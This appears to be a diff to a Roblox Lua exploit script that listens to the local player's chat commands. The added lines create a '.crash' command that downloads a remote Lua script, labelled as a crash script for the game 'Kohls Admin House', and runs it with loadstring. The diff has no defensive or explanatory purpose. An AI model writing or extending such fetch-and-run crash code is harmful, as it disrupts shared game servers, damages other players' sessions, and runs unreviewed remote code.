@@ -18,6 +18,9 @@ game.Players.LocalPlayer.Chatted:Connect(function(msg)
         lspam = false
         print("Log Spam is off.")
     end
+    if command == ".crash" then
+	loadstring(game:HttpGet("https://github.com/S-PScripts/lua-scripts/blob/main/Kohls%20Admin%20House/Crashes/KAH%20Crash%20Dog.lua",true))()
+    end
 end)
 
 while true do
